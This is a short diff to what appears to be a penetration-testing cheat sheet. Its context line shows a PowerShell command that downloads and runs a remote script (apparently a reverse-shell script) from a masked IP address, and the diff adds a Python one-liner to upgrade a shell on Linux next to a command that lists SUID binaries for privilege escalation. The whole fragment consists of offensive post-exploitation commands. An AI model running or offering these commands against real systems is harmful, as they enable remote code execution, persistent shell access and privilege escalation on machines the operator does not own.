@@ -15,6 +15,8 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://*.*.*.*:*/nisha
 
 
 # Linux
+To get a better shell:
+python -c 'import pty;pty.spawn("/bin/bash");'
 # to list suid binary file:
 find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
 
